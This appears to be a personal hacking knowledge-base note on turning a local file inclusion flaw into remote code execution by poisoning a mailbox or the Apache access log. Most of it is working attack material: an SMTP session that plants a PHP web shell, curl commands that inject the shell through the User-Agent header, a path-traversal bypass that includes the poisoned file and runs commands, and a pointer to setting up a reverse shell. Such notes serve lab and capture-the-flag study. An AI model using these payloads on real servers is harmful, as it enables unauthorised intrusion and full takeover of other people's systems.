---
tags: [technique, exploitation, web, rce]
aliases: [Log Poisoning, LFI to RCE]
---
# Mail / Log Poisoning (LFI → RCE)

> "Poison" a file that the server later includes via LFI with PHP code. On inclusion the code is executed => **RCE**.

## Principle
1. Pick a file with controllable content (mailbox, log).
2. Write a PHP payload into it.
3. Include the file via LFI → PHP runs.

## Mail as carrier
The mailbox lives in `/var/mail/<user>`. Inject mail via SMTP (port 25) – [[telnet]] / [[netcat]]:
```smtp
HELO x
MAIL FROM: <a@x>
RCPT TO: <user@localhost>
DATA
Subject: pwn

<?php system($_GET['cmd']); ?>
.
QUIT
```
> [!warning] `454 Relay access denied`
> The server only accepts its own domains. The greeting reveals the real hostname → use `user@localhost` or `user@<hostname>`.

## Log as carrier (Apache access.log)
Every HTTP request ends up in the access log. The last field is the **`User-Agent`** – freely chosen by the client and logged unchecked → an ideal carrier.

> [!info] Which log path?
> Log paths always sit in the same place per server/OS → test blindly. Full table: [[Linux Standard Paths]]. Most common hit: `/var/log/apache2/access.log`.

**(1)** Write the PHP payload as the User-Agent into the log – [[curl]]:
```bash
curl http://target/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  -b "PHPSESSID=<session>"
```
**(2)** Include the log via LFI + trigger the command via GET parameter:
```bash
curl "http://target/dashboard.php?cmd=id" \
  -b "PHPSESSID=<session>" \
  --data-urlencode "file=/var/log/apache2/access.log"
```
> [!note] POST body vs. URL parameter
> Here the page reads the file via a **POST parameter** (`file=`), but the web shell takes the command via the **GET parameter** (`?cmd=`). Both must be in the same request.

> [!tip] Escape `$`
> Inside the shell's double quotes, `\$_GET` must be escaped, otherwise the local bash expands the variable away.

## Web shell payload
```php
<?php system($_GET['cmd']); ?>
```
- `system()` = runs a shell command
- `$_GET['cmd']` = command from the URL => **1 file, any number of commands**

## Triggering
```bash
curl -G "http://target/index.php" \
  --data-urlencode "page=....//....//var/mail/user" \
  --data-urlencode "cmd=id"
```
=> Then set up a reverse shell for stable access.
